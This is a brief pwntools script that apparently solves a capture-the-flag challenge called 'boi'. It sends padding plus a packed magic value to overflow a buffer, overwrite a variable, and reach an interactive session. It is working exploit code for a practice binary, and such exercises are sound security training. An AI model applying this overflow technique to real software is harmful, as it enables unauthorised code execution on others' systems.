#!/usr/bin/python3

from pwn import *

e = context.binary = ELF("./boi", checksec=False)
p = process()

padding = b'A'*16
res = 0xCAF3BAEE00000000
payload = padding + p64(res)

#sys.stdout.buffer.write(payload)

p.sendafter(b" boiiiii??\n", payload)
p.interactive()
